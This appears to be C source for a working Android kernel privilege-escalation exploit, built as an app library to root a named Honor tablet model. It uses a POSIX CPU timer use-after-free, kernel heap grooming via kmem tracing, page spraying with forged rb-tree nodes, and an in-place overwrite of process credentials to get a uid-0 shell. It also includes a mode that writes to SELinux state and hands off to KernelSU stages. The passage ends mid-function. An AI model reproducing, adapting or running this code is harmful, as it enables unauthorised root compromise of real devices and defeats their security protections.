/*
 * CVE-2026-98260 - posix cpu timers: unprivileged uid-0 shell
 * Target : Honor MagicPad3 Pro 13.3 YLP-W00 / MagicOS 10.0.0,
 *          11.0.0.109 or 11.0.0.117(SP4)
 * Kernel : 6.12.38-android16-5-gfde7767f6ef6-abogki481467632-4k (verified)
 *          6.12.58-android16-6-g3a7ac1674240-abogki541502914-4k (verified)
 *          6.12.58-android16-6-g142ddad31e60-abogki576095858-4k (static, 117)
 * SELinux: Enforcing
 * Patches: absent
 * Mitig. : KASLR=on SMEP=on SMAP=on PAN=on; KASAN compiled but disabled
 * Status : EXP(root shell) - shell executes as uid 0 under SELinux
 *
 * This copy is built as the app's native library (libmagicroot.so) and is
 * entered through the deployed launcher, which dlopens it and calls
 * cve98260_main() or cve98260_wait().  The exploit itself is unchanged:
 * the child re-execs /proc/self/exe (the launcher) for the private exec cred
 * and the wait child.  CVE_ROOT_SCRIPT, when set, is executed by that uid-0
 * child after the cred write; it is the hand-off point for the KernelSU
 * stages.
 *
 * Instead of pointing the task at a fake cred (exp.c), this stage modifies a
 * real cred in place.  A child execs this binary; the exec allocates a private
 * cred (cred_jar, bytes_req 0xb8, call-site low21 from the profile:
 * 0x19c474 on 11.0.0.109, 0x1935e4 on 11.0.0.117) which is leaked
 * from the kmem trace.  The child blocks on a pipe while the stale timer node
 * is reaped against a payload whose single rb_erase writes
 *
 *     [cred + 8] = 0          (uid/gid of the exec'd child)
 *
 * With cred->uid now 0, the child calls setuid(0): the kernel accepts it
 * without CAP_SETUID because kuid == old->uid, and sets euid/fsuid to 0.
 * cred == real_cred stays true, the SELinux blob stays valid, and execve of
 * /system/bin/sh copies the cred through the normal commit_creds path.
 *
 * The resulting task is uid 0 inside u:r:shell:s0 with the exec capability
 * fixup (bounding set only), so it owns root files by DAC but has no
 * CAP_DAC_OVERRIDE; it is not unrestricted system root.
 *
 * Default action prints id and the context; pass "shell" for an interactive
 * shell.  On any unverified state the process parks without reaping.  A
 * keeper parent (lifecycle.h), a separate session, ignored SIGPIPE, and
 * KSU_CHAIN_HELD/PARKED markers keep that state visible without letting a
 * closed runner pipe or process-group signal kill the launcher.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdatomic.h>
#include <time.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>

#include "vuln_precheck.h"
#include "trace_ids.h"
#include "lifecycle.h"

#define TR "/sys/kernel/tracing"
#define CPU_TRIG 2
#define NTIMERS 4096
#define VICTIM_IDX 2048
#define PREFILL_TIMERS 4096
#define VMA_COUNT 50000
#define HELPER_STACK (1 << 20)
#define LOCKERS 4
#define PAGE 4096UL
#define SPRAY_MAX 32768
#define MAX_SOCKS 1024

#define STATIC_TIMER_SITE (cve98260_active_profile->timer_site)
#define TIMER_SITE_LOW21  (cve98260_active_profile->timer_low21)
#define TIMER_ALLOC       0x100ULL

#define CRED_SITE_LOW21 (cve98260_active_profile->cred_low21)
#define CRED_REQ        0xb8ULL
#define CRED_ALLOC      0xc0ULL

#define CHILD_HELLO 0x52445931
#define CHILD_MAGIC 0x50474552

/* KernelSU adaptation (app stage). */
#define PLANT_ZERO    0   /* [target] = 0 */
#define PLANT_PTR     1   /* [target] = stale node address A */
#define PLANT_SELINUX 2   /* [selinux_state + slide - 7] = 0 */

#define SELINUX_STATE_STATIC (cve98260_active_profile->selinux_state)
#define CRED_CAP_EFFECTIVE   0x40ULL

#define KSU_MAGIC1 0xdeadbeefU
#define KSU_MAGIC2 0xcafebabeU
#define KSU_IOCTL_GRANT_ROOT 0x4b01UL

extern int ko_patch_cli(int argc, char **argv);

struct ev {
    unsigned type;
    int pid;
    unsigned long long site, ptr, req, alloc;
    unsigned long long pfn;
    unsigned order;
    unsigned long long gfp;
    unsigned migratetype;
    unsigned long long tstamp;
};

struct page_alloc_ev {
    unsigned long long pfn, gfp, tstamp;
    unsigned order, migratetype;
    int cpu;
    int pid;
};

struct child_report {
    int magic;
    int uid, euid;
    int setuid_ret, setuid_errno;
    int ruid, reuid, rsuid;
    int ksu_ret, ksu_errno;
};

static _Atomic int g_go, g_stop, g_locker_started, g_locker_cpu;
static _Atomic int g_exec_tid, g_target_tgid, g_abort;
static void *g_frag_base;
static size_t g_frag_len;
static int g_ready_w = -1, g_ack_r = -1, g_tid_w = -1, g_pick_r = -1;
/* PLANT_PTR defers arming until the parent picks a bit16=1 victim; other
 * plants keep the original fixed-index arm-at-create path. */
static int g_defer_arm;
static int g_cpu = CPU_TRIG;
static unsigned long long g_base;
static int g_held;
static unsigned long long g_held_since;
static pid_t g_last_victim;
static int g_status_sent;
static timer_t g_timers[NTIMERS];
static unsigned long long g_slide;
static struct page_alloc_ev g_palloc[65536];
static int g_palloc_n;

static void logf(const char *fmt, ...)
{
    va_list ap, ap2;

    va_start(ap, fmt);
    vprintf(fmt, ap);
    if (cve_lifecycle_log_fd >= 0) {
        va_copy(ap2, ap);
        vdprintf(cve_lifecycle_log_fd, fmt, ap2);
        va_end(ap2);
    }
    va_end(ap);
    (void)fsync(STDOUT_FILENO);
    if (cve_lifecycle_log_fd >= 0)
        (void)fsync(cve_lifecycle_log_fd);
}

static void log_worker_stat(void)
{
    char b[512];
    ssize_t n;
    int fd;
    char *nl;

    fd = open("/proc/self/stat", O_RDONLY);
    if (fd < 0)
        return;
    n = read(fd, b, sizeof(b) - 1);
    close(fd);
    if (n <= 0)
        return;
    b[n] = 0;
    nl = strchr(b, '\n');
    if (nl)
        *nl = 0;
    logf("WORKER_PID=%d\n", (int)getpid());
    logf("WORKER_STAT=%s\n", b);
}

static int wr(const char *p, const char *s)
{
    int fd = open(p, O_WRONLY);
    if (fd < 0) return -1;
    int r = write(fd, s, strlen(s));
    close(fd);
    return r < 0 ? -1 : 0;
}
static void pin(int cpu)
{
    cpu_set_t set; CPU_ZERO(&set); CPU_SET(cpu, &set);
    sched_setaffinity(0, sizeof(set), &set);
}
static unsigned u32(const unsigned char *b, size_t o){unsigned v;memcpy(&v,b+o,4);return v;}
static unsigned long long u64(const unsigned char *b, size_t o){unsigned long long v;memcpy(&v,b+o,8);return v;}

static void enable_events(void)
{
    static const char *evs[] = {
        "enable_event:kmem:kmem_cache_alloc\n",
        "enable_event:kmem:mm_page_free\n",
        "enable_event:kmem:mm_page_alloc\n",
    };
    for (unsigned i = 0; i < sizeof(evs)/sizeof(evs[0]); i++)
        wr(TR "/events/kmem/rss_stat/trigger", evs[i]);
    /* Experimental: only when an exec event id was supplied/probed. */
    if (EV_SCHED_PROCESS_EXEC)
        wr(TR "/events/kmem/rss_stat/trigger",
           "enable_event:sched:sched_process_exec\n");
    if (wr(TR "/buffer_size_kb", "16384\n") != 0)
        logf("[trace] buffer_size_kb write failed\n");
}

static void drain_cpu(int cpu)
{
    unsigned char tmp[65536];
    char path[128];
    snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw", cpu);
    int fd = open(path, O_RDONLY | O_NONBLOCK);
    if (fd < 0) return;
    while (read(fd, tmp, sizeof(tmp)) > 0)
        ;
    close(fd);
}
static long trace_raw_used(void)
{
    unsigned char tmp[65536];
    long total = 0;

    for (int c = 0; c < 8; c++) {
        char path[128];
        int fd;
        ssize_t r;

        snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw", c);
        fd = open(path, O_RDONLY | O_NONBLOCK);
        if (fd < 0)
            continue;
        while ((r = read(fd, tmp, sizeof(tmp))) > 0)
            total += r;
        close(fd);
    }
    return total;
}

static void trace_truncate(void)
{
    int fd = open(TR "/trace", O_WRONLY | O_TRUNC);

    if (fd >= 0)
        close(fd);
}

static int g_trace_start_logged;
static void trace_start(void)
{
    wr(TR "/tracing_on", "0");
    trace_truncate();
    for (int c = 0; c < 8; c++)
        drain_cpu(c);
    wr(TR "/tracing_on", "1");
    if (!g_trace_start_logged) {
        g_trace_start_logged = 1;
        logf("[trace] start_used=%ld\n", trace_raw_used());
    }
}
static void trace_stop(void) { wr(TR "/tracing_on", "0"); }

/*
 * Drop the page events buffered while the timers were built; a plain
 * write to trace does not clear it, an O_TRUNC open resets every online
 * CPU.
 */
static void trace_clear(void)
{
    wr(TR "/tracing_on", "0");
    trace_truncate();
    wr(TR "/tracing_on", "1");
}

static unsigned long long now_ns(void)
{
    struct timespec ts;

    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (unsigned long long)ts.tv_sec * 1000000000ULL + ts.tv_nsec;
}

static long read_cpu(int cpu, unsigned char *buf, size_t cap)
{
    char path[128]; size_t tot = 0;
    snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw", cpu);
    int fd = open(path, O_RDONLY | O_NONBLOCK);
    if (fd < 0) return -1;
    while (tot < cap) {
        ssize_t r = read(fd, buf + tot, cap - tot);
        if (r <= 0) break;
        tot += (size_t)r;
    }
    close(fd);
    return (long)tot;
}

static int parse_events(const unsigned char *b, size_t n, struct ev *out, int max)
{
    int cnt = 0;
    for (size_t base = 0; base + PAGE <= n; base += PAGE) {
        unsigned long long commit = u64(b, base + 8);
        unsigned long long ts = u64(b, base);
        size_t o = base + 16, end = base + 16 + commit;
        if (end > base + PAGE) end = base + PAGE;
        while (o + 4 <= end) {
            unsigned hdr = u32(b, o), tl = hdr & 31, td = hdr >> 5;
            size_t total; int data = 0;
            if (tl == 29) {
                unsigned long long delta;

                if (!td) break;
                total = 4 + u32(b, o + 4);
                delta = ((unsigned long long)u32(b, o + 4) << 27) | td;
                ts += delta;
            } else if (tl == 30) {
                total = 8;
                ts = ((unsigned long long)u32(b, o + 4) << 27) | td;
            } else if (tl == 31) {
                total = 8;
            } else if (tl == 0) {
                total = 4 + u32(b, o + 4);
                data = 1;
                ts += td;
            } else {
                total = 4 + tl * 4;
                data = 1;
                ts += td;
            }
            size_t p = o + (tl == 0 ? 8 : 4);
            if (data && cnt < max && p + 8 <= end) {
                unsigned type = u32(b,p) & 0xffff;

                if (EV_SCHED_PROCESS_EXEC &&
                    type == EV_SCHED_PROCESS_EXEC) {
                    struct ev *e = &out[cnt++];
                    e->type = type;
                    e->tstamp = ts;
                    memcpy(&e->pid, b+p+4, 4);
                } else if (total >= 28 && p + 28 <= end) {
                    if (type == EV_KMEM_CACHE_ALLOC || type == EV_KMALLOC) {
                        struct ev *e = &out[cnt++];
                        e->type = type;
                        e->tstamp = ts;
                        memcpy(&e->pid, b+p+4, 4);
                        e->site = u64(b,p+8);
                        e->ptr = u64(b,p+16);
                        e->req = u64(b,p+24);
                        e->alloc = u64(b,p+32);
                    } else if (type == EV_MM_PAGE_FREE ||
                               type == EV_MM_PAGE_ALLOC) {
                        struct ev *e = &out[cnt++];
                        e->type = type;
                        e->tstamp = ts;
                        memcpy(&e->pid, b+p+4, 4);
                        e->pfn = u64(b,p+8);
                        e->order = u32(b,p+16);
                        e->gfp = u64(b,p+24);
                        e->migratetype = p + 36 <= end ? u32(b,p+32) : 0;
                    }
                }
            }
            if (total < 4) break;
            o += total;
        }
    }
    return cnt;
}

static unsigned long long calibrate_base(unsigned char *raw, struct ev *evs)
{
    unsigned long long hist[64] = {0}; int hcnt[64] = {0}; int hc = 0;
    unsigned long long recent[32] = {0}; int rn = 0;
    int made = 0;
    trace_start();
    for (int i = 0; i < 512; i++) {
        struct sigevent ev; timer_t t;
        memset(&ev, 0, sizeof(ev)); ev.sigev_notify = SIGEV_NONE;
        if (timer_create(CLOCK_MONOTONIC, &ev, &t))
            break;
        made++;
    }
    usleep(3000);
    trace_stop();
    long n = read_cpu(g_cpu, raw, 32u << 20);
    int c = n > 0 ? parse_events(raw, (size_t)n, evs, 300000) : 0;
    for (int i = 0; i < c; i++) {
        if (evs[i].type == EV_MM_PAGE_ALLOC && evs[i].order == 1) {
            if (rn < 32) recent[rn++] = evs[i].pfn;
            else {
                memmove(recent, recent + 1, 31 * sizeof(recent[0]));
                recent[31] = evs[i].pfn;
            }
        } else if (evs[i].type == EV_KMEM_CACHE_ALLOC &&
                   (evs[i].site & 0x1fffff) == TIMER_SITE_LOW21 && rn) {
            unsigned long long slab = evs[i].ptr & ~0x1fffULL;
            for (int j = 0; j < rn; j++) {
                unsigned long long b = slab - (recent[j] << 12);
                int f = 0;
                for (int k = 0; k < hc; k++)
                    if (hist[k] == b) { hcnt[k]++; f = 1; break; }
                if (!f && hc < 64) { hist[hc] = b; hcnt[hc] = 1; hc++; }
            }
        }
    }
    unsigned long long best = 0; int bestc = 0;
    for (int k = 0; k < hc; k++)
        if (hcnt[k] > bestc) { bestc = hcnt[k]; best = hist[k]; }
    logf("[base] made=%d best=%#llx count=%d\n", made, best, bestc);
    return bestc >= 4 ? best : 0;
}

static void kick_rss(void)
{
    size_t n = (size_t)32 << 20;
    char *p = mmap(NULL, n, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (p == MAP_FAILED)
        return;
    for (size_t i = 0; i < n; i += PAGE)
        p[i] = 1;
    munmap(p, n);
}

static timer_t *g_prefill;
static int g_prefill_n;

static void prefill_timers(int n)
{
    struct sigevent ev;

    g_prefill = calloc((size_t)n, sizeof(*g_prefill));
    if (!g_prefill)
        return;
    memset(&ev, 0, sizeof(ev));
    ev.sigev_notify = SIGEV_NONE;
    for (int i = 0; i < n; i++) {
        if (timer_create(CLOCK_MONOTONIC, &ev, &g_prefill[i]))
            break;
    }
    g_prefill_n = n;
}

static int prepare_fragmented_range(void)
{
    size_t len = (size_t)VMA_COUNT * PAGE;
    int fd = (int)syscall(SYS_memfd_create, "vma-page", 1);
    void *base;
    if (fd < 0 || ftruncate(fd, PAGE)) return -1;
    base = mmap(NULL, len, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (base == MAP_FAILED) return -1;
    for (unsigned long i = 0; i < VMA_COUNT; i++) {
        void *want = (char *)base + i * PAGE;
        if (mmap(want, PAGE, PROT_READ, MAP_SHARED | MAP_FIXED, fd, 0) != want)
            return -1;
    }
    close(fd);
    g_frag_base = base; g_frag_len = len;
    return 0;
}

static int locker_fn(void *x)
{
    static const int locker_cpus[LOCKERS] = { 1, 3, 4, 5 };
    int prot = PROT_NONE;
    unsigned slot = (unsigned)atomic_fetch_add(&g_locker_cpu, 1);
    (void)x;
    pin(locker_cpus[slot % LOCKERS]);
    while (!atomic_load(&g_go) && !atomic_load(&g_abort)) sched_yield();
    if (atomic_load(&g_abort))
        _exit(0);
    atomic_fetch_add(&g_locker_started, 1);
    while (!atomic_load(&g_stop) && !atomic_load(&g_abort)) {
        syscall(SYS_mprotect, g_frag_base, g_frag_len, prot);
        prot = prot == PROT_NONE ? PROT_READ : PROT_NONE;
    }
    _exit(0);
}
static int killer_fn(void *x)
{
    int tid, tgid;
    (void)x;
    pin(2);
    while (!(tid = atomic_load(&g_exec_tid)) && !atomic_load(&g_abort))
        sched_yield();
    if (atomic_load(&g_abort))
        _exit(0);
    tgid = atomic_load(&g_target_tgid);
    for (;;) {
        long r = syscall(SYS_tgkill, tgid, tid, 0);
        if (r < 0 && errno == ESRCH) break;
        sched_yield();
    }
    syscall(SYS_tgkill, tgid, tgid, SIGKILL);
    /*
     * Keep the mmap_lock contention alive until the dying task is gone.
     * The SIGKILL only turns the contended read lock into -EINTR; if the
     * lockers stop as soon as it is sent, the exec can take the fast path
     * through exec_mmap, run posix_cpu_timers_exit() and leave no stale
     * node for the reap (a silent plant miss).
     */
    for (int i = 0; i < 2000; i++) {
        char path[48], buf[256];
        long r;

        snprintf(path, sizeof(path), "/proc/%d/stat", tgid);
        r = -1;
        {
            int fd = open(path, O_RDONLY);

            if (fd >= 0) {
                ssize_t n = read(fd, buf, sizeof(buf) - 1);

                close(fd);
                if (n > 0) {
                    char *p;

                    buf[n] = 0;
                    p = strrchr(buf, ')');
                    if (p && p[1] == ' ' && p[2] == 'Z')
                        break;
                }
            }
        }
        r = syscall(SYS_tgkill, tgid, tgid, 0);
        if (r < 0 && errno == ESRCH)
            break;
        usleep(200);
    }
    atomic_store(&g_stop, 1);
    _exit(0);
}
static int spawn_vm_helper(int (*fn)(void *))
{
    void *st = mmap(NULL, HELPER_STACK, PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (st == MAP_FAILED) return -1;
    int p = clone(fn, (char *)st + HELPER_STACK, CLONE_VM | SIGCHLD, NULL);
    if (p < 0) munmap(st, HELPER_STACK);
    return p;
}

static void target_abort(int code)
{
    atomic_store(&g_abort, 1);
    _exit(code);
}

static void *exec_thread(void *x)
{
    struct sigevent ev_none, ev_victim;
    struct itimerspec dormant;
    char b = 'R', ack;
    char *const argv[] = {
        (char *)"uaf_plant", (char *)"--exec-ok", NULL
    };
    char *const envp[] = { NULL };
    (void)x;
    pin(2);
    prctl(PR_SET_NAME, "yexec", 0, 0, 0);
    memset(&ev_none, 0, sizeof(ev_none));
    ev_none.sigev_notify = SIGEV_NONE;
    memset(&ev_victim, 0, sizeof(ev_victim));
    ev_victim.sigev_notify = SIGEV_SIGNAL;
    ev_victim.sigev_signo = SIGRTMIN;
    memset(&dormant, 0, sizeof(dormant));
    dormant.it_value.tv_sec = 3600;

    if (write(g_ready_w, &b, 1) != 1) target_abort(117);
    if (read(g_ack_r, &ack, 1) != 1) target_abort(118);

    if (g_defer_arm) {
        /* PLANT_PTR: sigevent is fixed at timer_create(); create every
         * timer victim-shaped and arm only the one the parent selects. */
        for (int i = 0; i < NTIMERS; i++)
            if (timer_create(CLOCK_THREAD_CPUTIME_ID, &ev_victim, &g_timers[i]))
                target_abort(120);
    } else {
        /* SELINUX/ZERO: original fixed-index path, armed at creation. */
        for (int i = 0; i < NTIMERS; i++) {
            struct sigevent *e = (i == VICTIM_IDX) ? &ev_victim : &ev_none;

            if (timer_create(CLOCK_THREAD_CPUTIME_ID, e, &g_timers[i]))
                target_abort(120);
            if (i == VICTIM_IDX && timer_settime(g_timers[i], 0, &dormant, NULL))
                target_abort(121);
        }
    }
    int tid = (int)syscall(SYS_gettid);
    if (write(g_tid_w, &tid, sizeof(tid)) != sizeof(tid)) target_abort(122);
    {
        int pick = 0;

        /*
         * The parent validates all timer allocations and, for PLANT_PTR,
         * selects a fully owned slab whose stale node address carries
         * CAP_SYS_MODULE.  A bad or missing selection exits here, before
         * exec, so no stale timer or zombie is created.
         */
        alarm(30);
        if (read(g_pick_r, &pick, sizeof(pick)) != sizeof(pick)) {
            alarm(0);
            atomic_store(&g_abort, 1);
            target_abort(124);
        }
        alarm(0);
        if (pick <= 0 || pick > NTIMERS) {
            atomic_store(&g_abort, 1);
            target_abort(125);
        }
        /* Only the deferred path needs to arm here; the fixed-index path
         * already armed VICTIM_IDX during creation and pick is just a gate. */
        if (g_defer_arm &&
            timer_settime(g_timers[pick - 1], 0, &dormant, NULL)) {
            atomic_store(&g_abort, 1);
            target_abort(121);
        }
    }
    atomic_store(&g_exec_tid, tid);
    atomic_store(&g_go, 1);
    while (atomic_load(&g_locker_started) < LOCKERS) sched_yield();
    for (volatile unsigned long i = 0; i < 5000000UL; i++)
        __asm__ volatile("" ::: "memory");
    execve("/proc/self/exe", argv, envp);
    _exit(123);
}

static void run_target(void)
{
    pthread_t th;
    sigset_t set;
    atomic_store(&g_target_tgid, (int)getpid());
    pin(2);
    if (prepare_fragmented_range()) _exit(110);
    for (int i = 0; i < LOCKERS; i++)
        if (spawn_vm_helper(locker_fn) < 0) _exit(111);
    if (spawn_vm_helper(killer_fn) < 0) _exit(112);
    sigemptyset(&set); sigaddset(&set, SIGRTMIN);
    pthread_sigmask(SIG_BLOCK, &set, NULL);
    if (pthread_create(&th, NULL, exec_thread, NULL)) _exit(114);
    for (;;) sched_yield();
}

static int wait_zombie(pid_t pid, siginfo_t *si)
{
    struct timespec pause = { .tv_nsec = 10000000 };
    for (int i = 0; i < 400; i++) {
        memset(si, 0, sizeof(*si));
        if (waitid(P_PID, (id_t)pid, si, WEXITED | WNOHANG | WNOWAIT))
            return -1;
        if (si->si_pid == pid) return 0;
        nanosleep(&pause, NULL);
    }
    return -1;
}

static long now_ms(void)
{
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (long)ts.tv_sec * 1000 + ts.tv_nsec / 1000000;
}

static void park_forever(const char *why)
{
    /*
     * A failure path also parks.  Tell the runner before parking: the
     * pipeline closes its read end as soon as it sees KSU_CHAIN_OK/FAIL, so
     * any later output would be lost (and was the original SIGPIPE death).
     */
    log_worker_stat();
    if (!g_status_sent) {
        logf("KSU_CHAIN_HELD\n");
        logf("KSU_CHAIN_FAIL\n");
    }
    logf("[!] %s -- parking without reap (zombie held)\n", why);
    fflush(stdout);
    for (;;)
        pause();
}

static void hold_zombie(void)
{
    if (!g_held)
        g_held_since = now_ns();
    g_held++;
}

/*
 * A held zombie is only safe while this worker is alive: the keeper is the
 * subreaper, so if the worker is killed the placeholder is adopted and its
 * stale timer node can be reaped by init, which panics.  Do not keep running
 * with held zombies indefinitely; park (which keeps the worker alive and
 * stops touching anything) once a hold has lasted a minute.
 */
static void held_timeout_check(void)
{
    if (g_held && g_held_since &&
        now_ns() - g_held_since > 60000000000ULL)
        park_forever("held zombie timeout");
}

/*
 * The verify abort must not exit while the last plant child could still
 * hold an armed timer.  run_plant reaps every victim it does not hold, so
 * this is a no-op on the normal paths; if the victim is somehow still
 * alive, kill and reap it before the caller gives up.
 */
static void confirm_victim_reaped(void)
{
    int st;

    if (g_last_victim <= 0)
        return;
    if (waitpid(g_last_victim, &st, WNOHANG) == 0) {
        kill(g_last_victim, SIGKILL);
        waitpid(g_last_victim, &st, 0);
    }
}

/*
 * The stale timer node is at V+0x78.  A send of at most 32 KiB is copied
 * sequentially into page fragments, each starting at page offset 0.  If the
 * target page is page q of that send (q = 0..7), the node lands at payload
 * offset q*PAGE + (V & 0xfff) + 0x78.  q is independent of the physical
 * allocation base, so writing a node at every q covers order-1/2/3 blocks,
 * a lower base after buddy coalescing, and order fallback into multiple
 * fragments.  Each copy is a complete rb node: parent_color, rb_right = 0,
 * rb_left = target.
 *
 * PLANT_ZERO / PLANT_SELINUX: parent_color = 0.
 * PLANT_PTR: parent_color = A (RB_EMPTY self-parent), writes A to target.
 */
static void build_nodes(unsigned char *buf, unsigned long long V,
                        unsigned long long A, unsigned long long target, int kind)
{
    size_t base = (size_t)(V & 0xfff);

    memset(buf, 0, SPRAY_MAX);
    for (int p = 0; p < 8; p++) {
        size_t off = (size_t)p * PAGE + base + 0x78;

        *(unsigned long long *)(buf + off + 0x00) =
            (kind == PLANT_PTR) ? A : 0;
        *(unsigned long long *)(buf + off + 0x08) = 0;
        *(unsigned long long *)(buf + off + 0x10) = target;
    }
}

#define SPRAY_THREADS 8
#define ANON_LEN (16u << 20)
#define SPRAY_SOCKS 8192
static _Atomic int g_burst, g_stop_spray, g_cancel;
static int g_pool[SPRAY_SOCKS][2];
static int g_pool_n;
static int g_rawfd[8] = { -1, -1, -1, -1, -1, -1, -1, -1 };
static pthread_t g_spray_th[SPRAY_THREADS];
static int g_spray_n;
static int g_spray_done_n;

struct spray_arg {
    unsigned char *payload;
    int sock_first, sock_count, cpu;
    int actual_cpu;
    int tid;
    unsigned sends;
    void *map;
    size_t map_len;
    unsigned pages;
};

static struct spray_arg g_spray_args[SPRAY_THREADS];
/*
 * 4096 goes through alloc_skb_with_frags()'s order-0 fallback
 * (alloc_page(gfp_mask), no __GFP_COMP) and is unmovable, so it competes
 * for the freed slab page through the same pcp/buddy path as another
 * process' order-0 fallback.
 */
static const size_t g_send_len[4] = { 8192, 16384, 32768, 4096 };

static void ensure_pool(void)
{
    int snd = 16 << 20;

    if (g_pool_n)
        return;
    for (int i = 0; i < SPRAY_SOCKS; i++) {
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, g_pool[i]))
            break;
        setsockopt(g_pool[i][0], SOL_SOCKET, SO_SNDBUF, &snd, sizeof(snd));
        setsockopt(g_pool[i][1], SOL_SOCKET, SO_RCVBUF, &snd, sizeof(snd));
        g_pool_n++;
    }
    if (!g_pool_n)
        park_forever("no spray sockets");
}

static void ensure_raw(void)
{
    for (int cpu = 0; cpu < 8; cpu++) {
        char path[128];

        if (g_rawfd[cpu] >= 0)
            continue;
        snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw", cpu);
        g_rawfd[cpu] = open(path, O_RDONLY | O_NONBLOCK);
    }
}

static long read_fd(int fd, unsigned char *buf, size_t cap)
{
    size_t tot = 0;

    if (fd < 0)
        return 0;
    while (tot < cap) {
        ssize_t r = read(fd, buf + tot, cap - tot);

        if (r <= 0)
            break;
        tot += (size_t)r;
    }
    return (long)tot;
}

#define FUTEX_WAIT_PRIVATE 128
#define FUTEX_WAKE_PRIVATE 129

static void spray_wake(void)
{
    atomic_store(&g_burst, 1);
    syscall(SYS_futex, (int *)&g_burst, FUTEX_WAKE_PRIVATE, 1 << 30,
            NULL, NULL, 0);
}

static void spray_wait(void)
{
    while (!atomic_load(&g_burst) && !atomic_load(&g_cancel)) {
        struct timespec ts;

        /*
         * A 1 ms timeout keeps the pinned CPUs out of deep idle, so the
         * real wake does not pay the ~1.6 ms C-state exit latency seen on
         * the big cores with a long timeout.
         */
        ts.tv_sec = 0;
        ts.tv_nsec = 1000000;
        syscall(SYS_futex, (int *)&g_burst, FUTEX_WAIT_PRIVATE, 0,
                &ts, NULL, 0);
    }
}

static void *spray_thread(void *x)
{
    struct spray_arg *a = x;
    int w = 0;

    pin(a->cpu);
    a->actual_cpu = sched_getcpu();
    a->tid = (int)syscall(SYS_gettid);
    a->sends = 0;
    /*
     * Threads are parked on the futex before the exec gate; waking them
     * after mm_page_free avoids pthread_create/mmap and pipe wake latency
     * in the tiny free-to-realloc window.
     */
    spray_wait();
    if (atomic_load(&g_cancel))
        return NULL;
    size_t off = 0;

    while (!atomic_load(&g_stop_spray) &&
           (w < a->sock_count || off < a->map_len)) {
        if (w < a->sock_count) {
            int k = a->sock_first + w;

            (void)send(g_pool[k][0], a->payload,
                       g_send_len[w % 4], MSG_DONTWAIT);
            w++;
        }
        if (off < a->map_len) {
            memcpy((char *)a->map + off, a->payload, PAGE);
            off += PAGE;
            a->pages++;
        }
    }
    a->sends = (unsigned)w;
    return NULL;
}

static void start_spray_threads(unsigned char *payload)
{
    int per;

    if (g_spray_n)
        return;
    /*
     * The previous plant's anon pages may only be released now: the reap
     * that consumes the fake node happens before the next plant starts.
     */
    for (int i = 0; i < SPRAY_THREADS; i++) {
        if (g_spray_args[i].map)
            munmap(g_spray_args[i].map, g_spray_args[i].map_len);
        g_spray_args[i].map = NULL;
        g_spray_args[i].map_len = 0;
    }
    atomic_store(&g_burst, 0);
    atomic_store(&g_stop_spray, 0);
    atomic_store(&g_cancel, 0);
    g_spray_n = 0;
    per = g_pool_n / SPRAY_THREADS;
    if (per <= 0)
        per = 1;
    for (int i = 0; i < SPRAY_THREADS; i++) {
        void *m = mmap(NULL, ANON_LEN, PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_ANONYMOUS | MAP_NORESERVE, -1, 0);

        g_spray_args[i].payload = payload;
        g_spray_args[i].sock_first = i * per;
        g_spray_args[i].sock_count = per;
        g_spray_args[i].cpu = i;
        g_spray_args[i].map = m == MAP_FAILED ? NULL : m;
        g_spray_args[i].map_len = m == MAP_FAILED ? 0 : ANON_LEN;
        if (pthread_create(&g_spray_th[i], NULL, spray_thread,
                           &g_spray_args[i])) {
            if (m != MAP_FAILED)
                munmap(m, ANON_LEN);
            break;
        }
        g_spray_n++;
    }
    if (!g_spray_n)
        park_forever("no spray threads");
}

static void stop_spray_threads(void)
{
    atomic_store(&g_cancel, 1);
    atomic_store(&g_stop_spray, 1);
    spray_wake();
    g_spray_done_n = g_spray_n;
    for (int i = 0; i < g_spray_n; i++)
        pthread_join(g_spray_th[i], NULL);
    g_spray_n = 0;
}

struct target_alloc {
    int seen;
    unsigned long long ts, pfn, gfp;
    unsigned order, migratetype;
    int pid, cpu;
    size_t off;
};

/*
 * The requested send order is only a hint: alloc_skb_with_frags() decrements
 * order on allocation failure, and a 32 KiB send can become several smaller
 * fragments.  Accept any order 0..3 whose allocation range covers the target
 * page; the 8-page payload already has a node for every possible fragment
 * page index.  off_out is only a diagnostic relative offset.
 */
static int target_cover(unsigned long long alloc_pfn, unsigned order,
                        unsigned long long target_pfn, unsigned long long V,
                        size_t *off_out)
{
    unsigned long long npages, off;

    if (order > 3)
        return 0;
    if (order == 0) {
        if (target_pfn != alloc_pfn)
            return 0;
        off = (V & 0xfff) + 0x78;
    } else {
        npages = 1ULL << order;
        if (target_pfn < alloc_pfn || target_pfn >= alloc_pfn + npages)
            return 0;
        off = ((target_pfn - alloc_pfn) << 12) + (V & 0xfff) + 0x78;
    }
    if (off + 0x18 > ((unsigned long long)PAGE << order) ||
        off + 0x18 > SPRAY_MAX)
        return 0;
    if (off_out)
        *off_out = (size_t)off;
    return 1;
}

static int alloc_covers(unsigned long long pfn, unsigned order,
                        unsigned long long target)
{
    return order <= 3 && target >= pfn && target < pfn + (1ULL << order);
}

/*
 * A candidate is unusable when the last allocation covering its target page
 * is a foreign order>=2 block.  Only judge this when the victim slab's own
 * allocation is present in this round's trace; a prefilled slab has unknown
 * provenance and is left to the retry/steal logic.
 */
static int pre_alloc_covered(unsigned long long target_pfn,
                             unsigned long long slab_pfn, int etid)
{
    unsigned long long last_ts = 0;
    int slab_own_seen = 0;
    int covered = 0;

    for (int i = 0; i < g_palloc_n; i++) {
